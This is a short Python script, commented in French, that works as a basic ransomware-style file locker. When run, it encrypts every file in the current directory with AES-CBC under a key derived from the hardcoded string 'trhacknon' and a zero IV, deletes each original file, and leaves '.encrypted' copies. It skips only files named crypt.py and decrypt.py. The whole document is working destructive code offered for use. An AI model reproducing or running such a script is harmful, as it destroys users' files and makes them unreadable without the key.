import os
import hashlib
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_path, key):
    # Charger les données du fichier
    with open(file_path, 'rb') as file:
        data = file.read()

    # Initialiser le chiffrement
    cipher = Cipher(algorithms.AES(key), modes.CBC(b'\0' * 16), backend=default_backend())
    encryptor = cipher.encryptor()

    # Ajouter le padding PKCS7
    padder = padding.PKCS7(128).padder()
    data = padder.update(data) + padder.finalize()

    # Chiffrer les données
    ct = encryptor.update(data) + encryptor.finalize()

    # Écrire les données chiffrées dans un nouveau fichier
    os.remove(file_path)
    new_file_path = file_path + ".encrypted"
    with open(new_file_path, 'wb') as file:
        file.write(ct)

def encrypt_directory(directory, key):
    for file_name in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, file_name)) and file_name not in ["crypt.py","decrypt.py"]:
            encrypt_file(os.path.join(directory, file_name), key)

key = hashlib.sha256("trhacknon".encode()).digest()
current_directory = os.getcwd()
encrypt_directory(current_directory, key)
print("Les fichiers ont été chiffrés avec succès")
